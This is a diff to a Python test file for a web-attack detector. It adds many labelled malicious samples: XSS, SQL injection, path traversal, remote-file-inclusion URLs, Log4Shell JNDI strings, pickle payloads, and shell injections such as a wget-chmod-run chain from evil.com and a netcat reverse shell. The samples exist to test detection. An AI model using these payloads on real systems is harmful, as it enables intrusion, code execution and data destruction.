@@ -1,11 +1,18 @@
 import time
 from typing import NamedTuple
 
+import coverage
+import pytest
+
 from guard_core.models import SecurityConfig
 from guard_core.sync.handlers.suspatterns_handler import (
     ALL_DETECTION_CATEGORIES,
     SusPatternsManager,
 )
+
+
+def _cov_scale() -> float:
+    return 1.0 + 1.0 * (coverage.Coverage.current() is not None)
 
 
 class MaliciousCase(NamedTuple):
@@ -34,13 +41,21 @@ def _build_isolated_manager(config: SecurityConfig | None) -> SusPatternsManager
     return manager
 
 
-_PRODUCTION_MANAGER = _build_isolated_manager(None)
+_LEGACY_MANAGER = _build_isolated_manager(None)
+_PRODUCTION_MANAGER = _build_isolated_manager(SecurityConfig())
 
 _ENCODING_AWARE_MANAGER = _build_isolated_manager(SecurityConfig())
 _ENCODING_AWARE_MANAGER._semantic_analyzer = None
 
 _DETECTORS: dict[str, SusPatternsManager] = {
     "production": _PRODUCTION_MANAGER,
+    "legacy": _LEGACY_MANAGER,
+    "encoding_aware": _ENCODING_AWARE_MANAGER,
+}
+
+_LEGACY_SMOKE_DETECTORS: dict[str, SusPatternsManager] = {
+    "production": _LEGACY_MANAGER,
+    "legacy": _LEGACY_MANAGER,
     "encoding_aware": _ENCODING_AWARE_MANAGER,
 }
 
@@ -67,6 +82,115 @@ _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON = (
     "this stays a documented, measured gap"
 )
 
+_SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON = (
+    "a quoted absolute-path or env-prefixed shell invocation after a "
+    "semicolon is character-identical to the attack shape the widened "
+    "cmd_injection shell pattern must catch; the surface is symmetric with "
+    "the bare-shell form that fired in every released version, and "
+    "separating a quoted invocation from a real one requires contextual "
+    "evaluation, not regex shape"
+)
+
+_SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
+    "the bare-shell form of this prose shape fired in every released "
+    "version before the absolute-path and env-prefixed widening; pinned as "
+    "the control case the new pins are symmetric with"
+)
+
+_WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON = (
+    "a field whose entire value is an absolute-path or env-prefixed shell "
+    "invocation spec, the Docker/K8s command or entrypoint override shape, "
+    "is character-identical to the attack shape the widened cmd_injection "
+    "shell pattern must catch; the surface is symmetric with the bare-shell "
+    "form that fired in every released version, and an API that "
+    "legitimately carries command specs needs route-level configuration, "
+    "not a narrower pattern"
+)
+
+_WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
+    "the bare-shell form of this whole-value shape fired in every released "
+    "version before the absolute-path and env-prefixed widening; pinned as "
+    "the control case the new pins are symmetric with"
+)
+
+_ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON = (
+    "the bounded {0,8} var=val-prefix widening of the newline-delivered "
+    "shell -c pattern accepts one or more VAR=val assignments, chained up "
+    "to 8 deep, immediately before an env/shell invocation; a CI YAML run "
+    "step, a crontab line, and a Makefile recipe that legitimately prefix "
+    "a shell -c call with inline environment assignments (FOO=bar BAZ=qux "
+    "bash -c '...', PATH=/usr/bin:/bin bash -c '...') are character-"
+    "identical to that attack shape and cannot be told apart by structure "
+    "alone; these are benign in CI/config contexts and are exactly the "
+    "kind of shape users allowlist. The widened FP surface is accepted "
+    "with honest disclosure rather than narrowing the {0,8} bound back "
+    "and losing recall on the chained assignment-prefixed shell "
+    "injection shape it was built to catch"
+)
+
+_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON = (
+    "the dedicated RFI file_inclusion pattern flags any param-value "
+    "delivery of an explicit http(s)/ftp URL whose final path segment ends "
+    "in one of the RFI executable/includable target extensions; a genuine "
+    "raw-doc download link (README.txt, readme.txt, terms.txt) and a "
+    "genuine curl-pipe installer or legacy cgi-bin link (install.sh, "
+    "search.cgi) are character-identical to that param=scheme://host/"
+    "path.ext RFI payload shape and cannot be told apart by extension "
+    "alone; an app that legitimately serves such download or installer "
+    "links needs route-level allowlisting, not a narrower pattern that "
+    "would lose recall on the backdoor.txt/backdoor.pl-shaped payloads "
+    "this pattern was built to catch"
+)
+
+_SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON = (
+    "the shape-gated {{ }}/#{ } template patterns flag any request-value "
+    "delivery of a double-curly or hash-brace expression containing a bare "
+    "function-call shape (a word immediately followed by parentheses); a "
+    "genuine template's own filter or method call syntax (format(x), a "
+    "Jinja round(2) filter, a Ruby helper.format(value) call, a JS-style "
+    ".map(item => ...) arrow callback) is character-identical to that "
+    "call-branch SSTI shape and cannot be told apart by structure alone; "
+    "an app that legitimately accepts raw template source as a request "
+    "value needs route-level allowlisting, not a narrower pattern that "
+    "would lose recall on the {{config.items()}}/#{T(...).exec(...)} "
+    "RCE shape this gate was built to catch"
+)
+
+_SSTI_DATE_IN_BRACES_KNOWN_FP_REASON = (
+    "the quote-tolerant arithmetic branch of the {{ }}/#{ } shape gate "
+    "matches any digit-operator-digit run, and a hyphen-delimited date "
+    "embedded in braces ({{ 2024-01-02 }}, #{2024-12-31}) parses as "
+    "digit-minus-digit subtraction; a genuine date-in-braces value is "
+    "character-identical to that arithmetic SSTI shape and cannot be told "
+    "apart by structure alone; an app that legitimately delivers dates "
+    "inside template-looking braces needs route-level allowlisting, not a "
+    "narrower pattern that would lose recall on the {{7*7}}/{{7*'7'}} "
+    "arithmetic-probe shape this branch was built to catch"
+)
+
+_FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON = (
+    "the filename= file_upload patterns flag any occurrence of "
+    'filename="...ext" (quotes required, whitespace now tolerated around '
+    "the =) anywhere in scanned content, with no requirement that it sit "
+    "inside an actual multipart Content-Disposition header; a support "
+    "ticket, changelog, or code-review comment that quotes a dangerous "
+    'filename as a worked example (filename = "invoice.php") is '
+    "character-identical to a real upload's filename value and cannot be "
+    "told apart by structure alone; an app that legitimately accepts such "
+    "prose as a request value needs route-level allowlisting, not a "
+    "narrower pattern that would lose recall on the real "
+    'filename="shell.php"-shaped payload this pattern exists to catch. '
+    "This exact shape already matched with no whitespace around the = "
+    'before this round\'s fix (filename="invoice.php"); the whitespace '
+    "tolerance widens which spacing variants reach the same pre-existing, "
+    "unresolved tradeoff, it does not create a new one"
+)
+
+
+def _payload_as_ingested_from_the_wire(raw: bytes) -> str:
+    return raw.decode("utf-8", errors="surrogateescape")
+
+
 MALICIOUS_CORPUS: list[MaliciousCase] = [
     MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
     MaliciousCase(
@@ -87,9 +211,42 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "xss",
         '<div style="background:url(javascript:alert(1))">',
     ),
+    MaliciousCase(
+        "xss_div_style_expression_spaced_equals",
+        "xss",
+        '<div style = "expression(alert(1))">',
+    ),
+    MaliciousCase(
+        "xss_anchor_href_data_uri_spaced_equals",
+        "xss",
+        '<a href = "data:text/html,evil">click</a>',
+    ),
     MaliciousCase("xss_object_tag", "xss", '<object data="evil.html">payload</object>'),
     MaliciousCase("xss_svg_onload", "xss", "<svg onload=alert(1)>"),
     MaliciousCase("xss_embed_tag", "xss", "<embed src=evil.swf>malicious</embed>"),
+    MaliciousCase(
+        "xss_onerror_space_after_equals", "xss", "<img src=x onerror= alert(1)>"
+    ),
+    MaliciousCase(
+        "xss_onerror_space_around_equals", "xss", "<img src=x onerror = alert(1)>"
+    ),
+    MaliciousCase("xss_div_onclick_spaced_equals_quoted", "xss", '<div onclick = "x">'),
+    MaliciousCase(
+        "xss_onerror_tab_after_equals", "xss", "<img src=x onerror=\talert(1)>"
+    ),
+    MaliciousCase(
+        "xss_onerror_newline_after_equals", "xss", "<img src=x onerror=\nalert(1)>"
+    ),
+    MaliciousCase(
+        "xss_onerror_percent_encoded_space_after_equals",
+        "xss",
+        "<img src=x onerror=%20alert(1)>",
+    ),
+    MaliciousCase(
+        "xss_onerror_space_after_equals_quoted_value",
+        "xss",
+        '<img src=x onerror= "alert(1)">',
+    ),
     MaliciousCase(
         "xss_base64_wrapped_script_alert",
         "xss",
@@ -118,11 +275,28 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
     MaliciousCase(
         "sqli_select_where_password", "sqli", "SELECT password FROM users WHERE id=1"
     ),
+    MaliciousCase("sqli_numeric_tautology_comment", "sqli", "1 OR 1=1--"),
+    MaliciousCase("sqli_numeric_tautology_bare", "sqli", "1 OR 1=1"),
+    MaliciousCase("sqli_numeric_tautology_lower", "sqli", "1 or 1=1"),
+    MaliciousCase("sqli_numeric_tautology_five", "sqli", "5 OR 5=5"),
+    MaliciousCase("sqli_numeric_tautology_and", "sqli", "1 AND 1=1"),
+    MaliciousCase("sqli_numeric_tautology_param", "sqli", "id=1 OR 1=1--"),
+    MaliciousCase("sqli_placeholder_pct_s_tautology", "sqli", "WHERE id = %s;OR1=1--"),
+    MaliciousCase("sqli_placeholder_qmark_tautology", "sqli", "WHERE id = ?;OR1=1--"),
+    MaliciousCase("sqli_placeholder_dollar_tautology", "sqli", "WHERE id = $1;OR1=1--"),
     MaliciousCase("sqli_select_star", "sqli", "SELECT * FROM accounts"),
     MaliciousCase("sqli_union_select_null", "sqli", "' UNION SELECT NULL,NULL,NULL--"),
     MaliciousCase("sqli_or_tautology", "sqli", "1' OR '1'='1"),
     MaliciousCase("sqli_trailing_comment_dashdash", "sqli", "admin'--"),
     MaliciousCase("sqli_stacked_drop_table", "sqli", "1'; DROP TABLE users;--"),
+    MaliciousCase("sqli_stacked_create_table", "sqli", "1; CREATE TABLE evil (a int)"),
+    MaliciousCase("sqli_stacked_insert_into", "sqli", "1; INSERT INTO logs VALUES(1)"),
+    MaliciousCase("sqli_stacked_update_set", "sqli", "1; UPDATE users SET admin=1"),
+    MaliciousCase("sqli_stacked_delete_from", "sqli", "1; DELETE FROM sessions"),
+    MaliciousCase("sqli_stacked_select_from", "sqli", "1; SELECT name FROM users"),
+    MaliciousCase("sqli_stacked_replace_into", "sqli", "1; REPLACE INTO t VALUES(1)"),
+    MaliciousCase("sqli_exec_xp_cmdshell", "sqli", "1; EXEC xp_cmdshell('whoami')"),
+    MaliciousCase("sqli_exec_sp_configure", "sqli", "1; EXECUTE sp_configure"),
     MaliciousCase("sqli_time_based_sleep", "sqli", "id=5 AND SLEEP(5)"),
     MaliciousCase(
         "sqli_benchmark_blind", "sqli", "id=1 AND BENCHMARK(5000000,MD5('A'))"
@@ -206,6 +380,51 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "path_traversal",
         "%25c0%25ae/etc/passwd",
     ),
+    MaliciousCase(
+        "path_traversal_single_segment_literal_dot_encoded_slash",
+        "path_traversal",
+        "..%2fconfig.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_overlong_utf8_slash",
+        "path_traversal",
+        "..%c0%afconfig.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_iis_unicode_slash",
+        "path_traversal",
+        "..%u2215config.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_encoded_dot_pair_encoded_slash",
+        "path_traversal",
+        "%2e%2e%2fconfig.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_partial_encoded_dot",
+        "path_traversal",
+        ".%2e/config.yaml",
+    ),
+    MaliciousCase(
+        "dir_traversal_semicolon_path_parameter_bypass",
+        "dir_traversal",
+        "..;/config.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_overlong_lead_byte_literal_slash",
+        "path_traversal",
+        "..%c0%2fconfig.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_per_digit_double_encoded_slash",
+        "path_traversal",
+        "..%25%32%66config.yaml",
+    ),
+    MaliciousCase(
+        "path_traversal_single_segment_null_byte_before_literal_slash",
+        "path_traversal",
+        "..%00/config.yaml",
+    ),
     MaliciousCase("cmd_bare_backtick_whoami", "cmd_injection", "`whoami`"),
     MaliciousCase("cmd_bare_backtick_id", "cmd_injection", "`id`"),
     MaliciousCase(
@@ -238,22 +457,6 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_separator_semicolon_nc",
         "cmd_injection",
         "; nc -e /bin/sh 10.0.0.1 4444",
-    ),
-    MaliciousCase(
-        "cmd_glued_prefix_known_gap",
-        "cmd_injection",
-        "search`id`",
-        "production",
-        "the backtick pattern is anchored with \\A...\\Z over the whole "
-        "scanned string, so a payload glued to a preceding token never matches",
-    ),
-    MaliciousCase(
-        "cmd_glued_suffix_known_gap",
-        "cmd_injection",
-        "`id`suffix",
-        "production",
-        "the backtick pattern is anchored with \\A...\\Z over the whole "
-        "scanned string, so a payload glued to a trailing token never matches",
     ),
     MaliciousCase(
         "cmd_base64_wrapped_reverse_shell",
@@ -294,6 +497,8 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_injection",
         "bash -c 'rm -rf /'",
     ),
+    MaliciousCase("cmd_absolute_path_shell_dash_c", "cmd_injection", "/bin/sh -c id"),
+    MaliciousCase("cmd_env_prefixed_shell_dash_c", "cmd_injection", "env bash -c id"),
     MaliciousCase(
         "cmd_injection_base64_hex_safe_evasion_netcat",
         "cmd_injection",
@@ -336,12 +541,54 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "file_inclusion",
         "src=//evil.io/malicious.js",
     ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_shell_php",
+        "file_inclusion",
+        "?page=http://attacker.com/shell.php",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_backdoor_txt",
+        "file_inclusion",
+        "?file=https://evil.example/backdoor.txt",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_ftp_domain_inc_phtml",
+        "file_inclusion",
+        "?template=ftp://evil/inc.phtml",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_ipv4_query_string",
+        "file_inclusion",
+        "?include=http://198.51.100.7/c99.php?cmd=id",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_shell_asp",
+        "file_inclusion",
+        "?page=https://evil.example.com/shell.asp",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_webshell_jsp",
+        "file_inclusion",
+        "?file=http://malicious-host.example/webshell.jsp",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_backdoor_pl",
+        "file_inclusion",
+        "?exec=http://attacker.net/backdoor.pl",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_payload_phar",
+        "file_inclusion",
+        "?load=https://evil.io/payload.phar",
+    ),
     MaliciousCase("ldap_wildcard_or_filter", "ldap", "(|(uid=*)(cn=*))"),
     MaliciousCase("ldap_wildcard_equals", "ldap", "cn=*)(uid=*"),
     MaliciousCase("ldap_and_filter_injection", "ldap", "(&(objectClass=user)(uid=*))"),
     MaliciousCase("ldap_bare_or_paren", "ldap", "admin)(|(password=*"),
     MaliciousCase("ldap_wildcard_password_bypass", "ldap", "*)(password=*)"),
     MaliciousCase("ldap_nested_filter_bypass", "ldap", "(|(&"),
+    MaliciousCase("ldap_double_paren_wildcard_breakout", "ldap", "*)((objectClass=*"),
+    MaliciousCase("ldap_null_byte_truncation_breakout", "ldap", "*))%00"),
     MaliciousCase(
         "xml_external_entity_file",
         "xml",
@@ -422,7 +669,56 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "nosql_in_operator_array", "nosql", '{"role": {"$in": ["admin","root"]}}'
     ),
     MaliciousCase("nosql_exists_operator", "nosql", '{"$exists": true}'),
+    MaliciousCase("nosql_ne_operator_bracket_key", "nosql", "username[$ne]=admin"),
+    MaliciousCase("nosql_gt_operator_bracket_key", "nosql", "filter[$gt]=100"),
+    MaliciousCase("nosql_regex_operator_bracket_key", "nosql", "search[$regex]=.*"),
+    MaliciousCase("nosql_where_operator_bracket_key", "nosql", "x[$where]=sleep(1)"),
     MaliciousCase("file_upload_php_extension", "file_upload", 'filename="shell.php"'),
+    MaliciousCase(
+        "file_upload_space_around_equals", "file_upload", 'filename = "shell.php"'
+    ),
+    MaliciousCase(
+        "file_upload_space_before_equals", "file_upload", 'filename ="shell.php"'
+    ),
+    MaliciousCase(
+        "file_upload_space_after_equals", "file_upload", 'filename= "shell.php"'
+    ),
+    MaliciousCase(
+        "file_upload_tab_around_equals",
+        "file_upload",
+        'filename\t=\t"shell.php"',
+    ),
+    MaliciousCase(
+        "file_upload_newline_after_equals",
+        "file_upload",
+        'filename=\n"shell.php"',
+    ),
+    MaliciousCase(
+        "file_upload_percent_encoded_space_around_equals",
+        "file_upload",
+        'filename%20=%20"shell.php"',
+        "encoding_aware",
+    ),
+    MaliciousCase(
+        "file_upload_single_quote_space_around_equals",
+        "file_upload",
+        "filename = 'shell.php'",
+    ),
+    MaliciousCase(
+        "file_upload_double_extension_space_around_equals",
+        "file_upload",
+        'filename = "shell.php.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_truncation_space_around_equals",
+        "file_upload",
+        'filename = "shell.php%00.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_decoded_truncation_space_around_equals",
+        "file_upload",
+        'filename = "shell.php\x00.jpg"',
+    ),
     MaliciousCase(
         "file_upload_phtml_extension", "file_upload", 'filename="shell.phtml"'
     ),
@@ -436,6 +732,50 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
     MaliciousCase(
         "file_upload_exe_extension", "file_upload", 'filename="installer.exe"'
     ),
+    MaliciousCase(
+        "file_upload_double_extension_php_jpg",
+        "file_upload",
+        'filename="shell.php.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_double_extension_asp_png",
+        "file_upload",
+        'filename="malware.asp.png"',
+    ),
+    MaliciousCase(
+        "file_upload_null_byte_percent_encoded",
+        "file_upload",
+        'filename="shell.php%00.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_null_byte_raw_0x00",
+        "file_upload",
+        'filename="shell.php\x00.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_null_byte_short_escape",
+        "file_upload",
+        'filename="shell.php\\0.jpg"',
+    ),
+    MaliciousCase("file_upload_pht_extension", "file_upload", 'filename="shell.pht"'),
+    MaliciousCase(
+        "file_upload_double_extension_pht_jpg",
+        "file_upload",
+        'filename="shell.pht.jpg"',
+    ),
+    MaliciousCase(
+        "file_upload_jspx_extension", "file_upload", 'filename="webshell.jspx"'
+    ),
+    MaliciousCase(
+        "file_upload_shtml_extension", "file_upload", 'filename="shell.shtml"'
+    ),
+    MaliciousCase("file_upload_ashx_extension", "file_upload", 'filename="shell.ashx"'),
+    MaliciousCase("file_upload_asa_extension", "file_upload", 'filename="shell.asa"'),
+    MaliciousCase("file_upload_asax_extension", "file_upload", 'filename="shell.asax"'),
+    MaliciousCase("file_upload_ascx_extension", "file_upload", 'filename="shell.ascx"'),
+    MaliciousCase("file_upload_cfm_extension", "file_upload", 'filename="shell.cfm"'),
+    MaliciousCase("file_upload_cfc_extension", "file_upload", 'filename="shell.cfc"'),
+    MaliciousCase("file_upload_war_extension", "file_upload", 'filename="shell.war"'),
     MaliciousCase(
         "template_double_curly_system",
         "template",
@@ -587,6 +927,21 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "proto_pollution",
         "eyJfX3Byb3RvX18iOnsiaXNBZG1pbiI6dHJ1ZX19",
         "encoding_aware",
+    ),
+    MaliciousCase(
+        "proto_pollution_bracket_arbitrary_key",
+        "proto_pollution",
+        "__proto__[isAdmin]=true",
+    ),
+    MaliciousCase(
+        "proto_pollution_constructor_bracket_prototype_unquoted",
+        "proto_pollution",
+        "constructor[prototype][isAdmin]=true",
+    ),
+    MaliciousCase(
+        "proto_pollution_dot_arbitrary_key",
+        "proto_pollution",
+        "__proto__.polluted=1",
     ),
     MaliciousCase(
         "code_injection_process_start",
@@ -829,6 +1184,280 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "production",
         _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     ),
+    MaliciousCase(
+        "cmd_env_abs_path_shell_dash_c", "cmd_injection", "/usr/bin/env bash -c id"
+    ),
+    MaliciousCase(
+        "cmd_separator_env_abs_path_shell",
+        "cmd_injection",
+        "; /usr/bin/env sh -c id",
+    ),
+    MaliciousCase(
+        "cms_probing_wp_content_themes_default",
+        "cms_probing",
+        "/wp-content/themes/default",
+    ),
+    MaliciousCase("recon_nested_inicio_html", "recon", "/en/inicio.html"),
+    MaliciousCase("ldap_null_byte_single_paren_attr_uid", "ldap", "uid=*)%00"),
+    MaliciousCase("ldap_null_byte_single_paren_filter_uid", "ldap", "(uid=*)%00"),
+    MaliciousCase("ldap_null_byte_single_paren_attr_mail", "ldap", "mail=*)%00"),
+    MaliciousCase(
+        "ldap_null_byte_single_paren_attr_objectclass",
+        "ldap",
+        "objectClass=*)%00",
+    ),
+    MaliciousCase(
+        "cmd_glued_backtick_past_rejected_leftmost_match",
+        "cmd_injection",
+        "`id` search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_after_glued_shell_command",
+        "cmd_injection",
+        "search`whoami` LIMIT 10",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_before_glued_shell_command",
+        "cmd_injection",
+        "SELECT note; search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_prefix_command_word_glued_shell_command",
+        "cmd_injection",
+        "curl`whoami` data on file",
+    ),
+    MaliciousCase(
+        "cmd_defect5_sql_keyword_within_exemption_window",
+        "cmd_injection",
+        "SELECT " + ("z" * 26) + " search`whoami`",
+    ),
+    MaliciousCase(
+        "cmd_defect5_bare_chained_download_and_execute_in_prose",
+        "cmd_injection",
+        "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
+    ),
+    MaliciousCase("cmd_dollar_paren_bare_whoami", "cmd_injection", "$(whoami)"),
+    MaliciousCase(
+        "cmd_dollar_paren_bare_cat_passwd", "cmd_injection", "$(cat /etc/passwd)"
+    ),
+    MaliciousCase(
+        "cmd_dollar_paren_glued_prefix_curl_evil_com",
+        "cmd_injection",
+        "x$(curl evil.com)",
+    ),
+    MaliciousCase(
+        "cmd_dollar_paren_glued_wrapped_whoami",
+        "cmd_injection",
+        "foo$(whoami)bar",
+    ),
+    MaliciousCase("cmd_dollar_brace_bare_ifs", "cmd_injection", "${IFS}"),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_ldap",
+        "cmd_injection",
+        "${jndi:ldap://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_rmi",
+        "cmd_injection",
+        "${jndi:rmi://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_dns",
+        "cmd_injection",
+        "${jndi:dns://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_lower_bare", "cmd_injection", "${lower:j}ndi"
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_default_value_bare",
+        "cmd_injection",
+        "${::-j}ndi",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_nested_full_exploit",
+        "cmd_injection",
+        "${${lower:j}ndi:ldap://evil.example/a}",
+    ),
+    MaliciousCase("cmd_denylist_glued_nmap", "cmd_injection", "x`nmap`"),
+    MaliciousCase("cmd_denylist_glued_powershell", "cmd_injection", "x`powershell`"),
+    MaliciousCase("xss_ontoggle_details", "xss", "<details ontoggle=alert(1)>"),
+    MaliciousCase("xss_onpointerdown_div", "xss", "<div onpointerdown=alert(1)>"),
+    MaliciousCase("xss_onanimationstart_svg", "xss", "<svg onanimationstart=alert(1)>"),
+    MaliciousCase("xss_onmousedown_body", "xss", "<body onmousedown=alert(1)>"),
+    MaliciousCase("xss_onwheel_div", "xss", "<div onwheel=alert(1)>"),
+    MaliciousCase(
+        "ssrf_userinfo_prefixed_named_host_localhost",
+        "ssrf",
+        "http://x@localhost/",
+    ),
+    MaliciousCase(
+        "ssrf_userinfo_prefixed_named_host_gcp_metadata",
+        "ssrf",
+        "http://attacker@metadata.google.internal/",
+    ),
+    MaliciousCase("xss_svg_onload_slash_sep", "xss", "<svg/onload=alert(1)>"),
+    MaliciousCase("xss_img_onerror_slash_sep", "xss", "<img/onerror=alert(1)>"),
+    MaliciousCase("xss_svg_onbegin_slash_sep", "xss", "<svg/onbegin=alert(1)>"),
+    MaliciousCase(
+        "xss_details_ontoggle_slash_sep", "xss", "<details/ontoggle=alert(1)>"
+    ),
+    MaliciousCase("xss_body_onactivate_quoted", "xss", '<body onactivate="alert(1)">'),
+    MaliciousCase("xss_input_onfocusin_quoted", "xss", '<input onfocusin="alert(1)">'),
+    MaliciousCase(
+        "xss_div_onmousewheel_quoted", "xss", '<div onmousewheel="alert(1)">'
+    ),
+    MaliciousCase(
+        "xss_marquee_onbounce_quoted", "xss", '<marquee onbounce="alert(1)">'
+    ),
+    MaliciousCase(
+        "xss_div_onwebkitfullscreenchange_quoted",
+        "xss",
+        '<div onwebkitfullscreenchange="alert(1)">',
+    ),
+    MaliciousCase(
+        "xss_x_onafterscriptexecute_quoted",
+        "xss",
+        '<x onafterscriptexecute="alert(1)">',
+    ),
+    MaliciousCase(
+        "xss_x_onbeforescriptexecute_quoted",
+        "xss",
+        '<x onbeforescriptexecute="alert(1)">',
+    ),
+    MaliciousCase("template_ssti_curly_brace_arith_int", "template", "{{7*7}}"),
+    MaliciousCase(
+        "template_ssti_curly_brace_arith_quoted_right", "template", "{{7*'7'}}"
+    ),
+    MaliciousCase(
+        "template_ssti_curly_brace_arith_quoted_left", "template", "{{'7'*7}}"
+    ),
+    MaliciousCase(
+        "template_ssti_curly_brace_arith_double_quoted",
+        "template",
+        '{{"5"+"5"}}',
+    ),
+    MaliciousCase("template_ssti_curly_brace_call", "template", "{{config.items()}}"),
+    MaliciousCase("template_ssti_hash_brace_arith", "template", "#{7*7}"),
+    MaliciousCase(
+        "template_ssti_hash_brace_java_runtime_exec",
+        "template",
+        "#{T(java.lang.Runtime).exec('id')}",
+    ),
+    MaliciousCase("ssrf_double_at_parser_confusion", "ssrf", "http://a@b@evil.com"),
+    MaliciousCase(
+        "ssrf_double_at_metadata_ip_masked",
+        "ssrf",
+        "http://169.254.169.254@trusted@evil.com",
+    ),
+    MaliciousCase(
+        "sensitive_file_trailing_tilde_wp_config",
+        "sensitive_file",
+        "/wp-config.php~",
+    ),
+    MaliciousCase(
+        "sensitive_file_trailing_tilde_bare_config",
+        "sensitive_file",
+        "config.php~",
+    ),
+    MaliciousCase("sensitive_file_trailing_tilde_env", "sensitive_file", "/.env~"),
+    MaliciousCase(
+        "deserialization_java_serialized_object_b64",
+        "deserialization",
+        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkA"
+        "CXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9veA==",
+    ),
+    MaliciousCase(
+        "deserialization_dotnet_binaryformatter_b64",
+        "deserialization",
+        "AAEAAAD/////AQAAAAAAAABTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92"
+        "aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
+        "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQ==",
+    ),
+    MaliciousCase(
+        "deserialization_python_pickle_proto4_b64",
+        "deserialization",
+        "gASVIwAAAAAAAAB9lCiMBHVzZXKUjAVhbGljZZSMBHJvbGWUjAVhZG1pbpR1Lg==",
+    ),
+    MaliciousCase(
+        "deserialization_ruby_marshal_gem_requirement_b64",
+        "deserialization",
+        "BAhvOhVHZW06OlJlcXVpcmVtZW50BjoSQHJlcXVpcmVtZW50c1sG",
+    ),
+    MaliciousCase(
+        "deserialization_php_object_injection_stdclass",
+        "deserialization",
+        'O:8:"stdClass":1:{s:4:"prop";s:9:"pwnedval1";}',
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_os_system",
+        "deserialization",
+        "cos\nsystem\n(S'id'\ntR.",
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_arbitrary_module",
+        "deserialization",
+        "cshutil\nrmtree\n(S'/tmp/x'\ntR.",
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_none_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"Ncshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_empty_dict_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"}cshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_mark_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"(cshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_proto_header_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"\x80\x04cshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_binint1_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"K\x00cshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_pickle_global_opcode_newtrue_prefixed",
+        "deserialization",
+        _payload_as_ingested_from_the_wire(b"\x88cshutil\nrmtree\n(S'/tmp/x'\ntR."),
+    ),
+    MaliciousCase(
+        "deserialization_ruby_marshal_array_top_level_b64",
+        "deserialization",
+        "BAhbBmkGaQc=",
+    ),
+    MaliciousCase(
+        "deserialization_ruby_marshal_hash_top_level_b64",
+        "deserialization",
